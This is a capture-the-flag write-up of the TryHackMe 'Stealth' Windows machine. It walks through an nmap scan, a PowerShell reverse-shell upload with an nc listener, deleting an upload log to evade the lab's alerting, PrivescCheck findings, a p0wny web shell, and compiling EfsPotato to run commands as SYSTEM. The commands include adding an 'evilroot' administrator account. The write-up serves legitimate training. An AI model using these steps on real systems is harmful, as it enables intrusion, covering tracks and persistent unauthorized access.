---
title: "TryHackMe - Stealth"
date: 2025-05-05 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [windows exploitation, EfsPotato, rdp, php, PrivescCheck ,privilege escalation, reverse shell, p0wny shell, EFSRPC ]
---

## Reconnaissance

I began with a full TCP port scan using nmap with the following options:

```console
──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV -T4 -p- 10.10.48.118
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 08:10 EDT
Nmap scan report for 10.10.48.118
Host is up (0.075s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-05T12:13:16+00:00
| ssl-cert: Subject: commonName=HostEvasion
| Not valid before: 2025-05-04T12:09:24
|_Not valid after:  2025-11-03T12:09:24
|_ssl-date: 2025-05-05T12:13:55+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
8000/tcp  open  http          PHP cli server 5.5 or later
|_http-title: 404 Not Found
8080/tcp  open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: PowerShell Script Analyser
8443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: PowerShell Script Analyser
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-05T12:13:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

The output revealed multiple open services:

- SMB (139, 445),

- RDP (3389),

- Microsoft HTTPAPI (5985, 47001),

- Apache (8080, 8443),

- PHP HTTP server (8000),

- Multiple MSRPC services (49664-49670)


Upon inspecting the web app, I noticed it allowed uploading PowerShell scripts – suggesting a potential Remote Code Execution (RCE) vulnerability.

![page](/images/stealth/page.jpg)

I generated a basic reverse shell using [Reverse Shell Generator](https://www.revshells.com), then uploaded it to the web application by exploiting the RCE vulnerability in order to obtain a shell.

![shell](/images/stealth/shell.jpg)

and launched the listener:

```
 nc -nvlp 4444
```

After successful upload, reverse shell connected to my listener. I got access as user `evader`. I found an encoded message on the evader's `Desktop`


```console
Windows PowerShell  Copyright (C) Microsoft Corporation. All rights reserved.  PS C:\Users\evader> 
ls
3D Objects Contacts Desktop Documents Downloads Favorites Links Music Pictures Saved Games Searches Videos
cd Desktop

ls
EC2 Feedback.website EC2 Microsoft Windows Guide.website encodedflag
Get-Content encodedflag
-----BEGIN CERTIFICATE----- WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w aHA= -----END CERTIFICATE-----

```

```
-----BEGIN CERTIFICATE----- 
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w aHA= 
-----END CERTIFICATE-----
```
and decoded it using [CyberChef](https://gchq.github.io/CyberChef/) and retrieved a link to a non-standard PHP script:

![1cyberchef](/images/stealth/1cyberchef.jpg)

`You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php`

Visiting the decoded link triggered the message:

![2page](/images/stealth/2page.jpg)

`Hey, seems like you have uploaded invalid file. Blue team has been alerted.
Hint: Maybe removing the logs files for file uploads can help?`


Guided by hints provided by the CTF author, I conducted a thorough examination of the file system in search of relevant log files. Deleting a file from the **Documents** directory did not produce any results. After further inspection, the expected behavior was only triggered upon removing `log.txt` from the `xampp\htdocs\uploads` directory.

```
ls
EFI PerfLogs Program Files Program Files (x86) Tools Users Windows xampp
cd xampp

ls
anonymous apache cgi-bin contrib htdocs img install licenses locale mailoutput mailtodisk mysql php phpMyAdmin src tmp webdav apache_start.bat apache_stop.bat catalina_service.bat catalina_start.bat catalina_stop.bat ctlscript.bat DebugCrashTHM.exe filezilla_setup.bat filezilla_start.bat filezilla_stop.bat killprocess.bat mercury_start.bat mercury_stop.bat mysql_start.bat mysql_stop.bat passwords.txt properties.ini readme_de.txt readme_en.txt service.exe setup_xampp.bat test_php.bat UACME-Akagi64.exe uninstall.dat uninstall.exe xampp-control.exe xampp-control.ini xampp-control.log xampp_shell.bat xampp_start.exe xampp_stop.exe
cd htdocs

ls
uploads 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2 background-image.jpg background-image2.jpg font.css index.php
cd uploads

ls
hello.ps1 index.php log.txt shell.ps1 vulnerable.ps1
del log.txt

ls
hello.ps1 index.php shell.ps1 vulnerable.ps1

```

Deleting it allowed the hidden PHP page to load correctly and reveal the first flag.

![1flag](/images/stealth/3page-1stflag.jpg)

Using the [PrivescCheck tool]((https://github.com/itm4n/PrivescCheck) ), I scanned the local permissions:

`powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"`

```console
A0004 - Privilege Escalation	
Service image file permissions	Check whether the current user has any write permissions on a service's binary or its folder.	
*High*	  
Name              : Apache2.4 
DisplayName       : Apache2.4 
User              : .\evader 
ImagePath         : "C:\xampp\apache\bin\httpd.exe" -k runservice 
StartMode         : 
Automatic Type              : Win32OwnProcess 
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services 
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\Apache2.4 
Status            :  
UserCanStart      : False 
UserCanStop       : False 
ModifiablePath    : C:\xampp\apache\bin\httpd.exe 
IdentityReference : BUILTIN\Users (S-1-5-32-545) 
Permissions       : AllAccess 
```


The user evader has full write permissions (Full Control) over the Apache `httpd.exe` binary, which is executed as a service with SYSTEM-level privileges. This represents a serious security flaw, as it allows the executable to be overwritten and arbitrary code to be executed with SYSTEM privileges.

I found also: 

```console

TA0004 - Privilege Escalation
PATH folder permissions	
Check whether the current user has any write permissions on the system-wide PATH folders. 
If so, the system could be vulnerable to privilege escalation through ghost DLL hijacking.	
*High*	  
Path              : C:\xampp\php 
ModifiablePath    : C:\xampp\php 
IdentityReference : BUILTIN\Users (S-1-5-32-545) 
Permissions       : AllAccess  

```
The message concerns folder permissions in the PATH environment variable, which can lead to privilege escalation through a DLL hijacking attack. In this case, the user has full write permissions to the `C:\xampp\php` folder, creating a risk that they could place a malicious DLL file there. If the system loads this DLL, the attacker could execute unauthorized code. To prevent such risks, folders in the PATH should have appropriate, restricted permissions.


I conducted further research online to identify additional privilege escalation vectors and came across the [p0wny shell](https://github.com/flozz/p0wny-shell) which provides more permissions. I uploaded the `shell.php` file to `C:\xampp\htdocs\` using a Python HTTP server, which allowed me to access and launch the shell via the browser:

`10.10.48.118:8080/shell.php`

![4p0wnyshell](/images/stealth/4p0wnyshell.jpg)

With access to the `p0wny shell`, I ran the command `whoami /priv` and discovered that the `SEImpersonatePrivilege` was `enabled`. This allowed me to impersonate other users and escalate my privileges. To exploit this, I downloaded and used [EfsPotato](https://github.com/zcgonvh/EfsPotato). 

EfsPotato takes advantage of a vulnerability in the EFSRPC protocol to escalate privileges and spawn a shell with SYSTEM rights. By leveraging the `SEImpersonatePrivilege`, I was able to use EfsPotato to execute arbitrary code with SYSTEM-level privileges, granting me full control over the system.

![efs potato upload](/images/stealth/5efspotatodownl.jpg)

I compiled the exploit using Microsoft .NET Framework and executed it with the following command:

`csc.exe -out:C:\Users\evader\Desktop\efs.exe C:\Users\evader\EfsPotato.cs -nowarn:1691,618`

![potatorun](/images/stealth/6efspotatorun.png)

Everything worked as expected — I verified it by executing the command: `.\efs.exe "whoami"`

![whoami](/images/stealth/7potatoworks.jpg)

I proceeded to create a new local administrator account by executing:
`.\efs.exe "net user evilroot Password123! /add"`. Then, I added the newly created user to the Administrators group:
`.\efs.exe "net localgroup Administrators evilroot /add"`

![administratoraccoutn](/images/stealth/8adminacc.jpg)

Next, I established a remote desktop connection to the target machine using Remmina, authenticating with the newly created administrator account.

![remminaconnect](/images/stealth/9remminaconn.jpg)

After connecting to the machine, I was able to retrieve the root flag, which was located on the `Desktop` of the `Administrator` user.

![rootflag](/images/stealth/10remmflag.jpg)




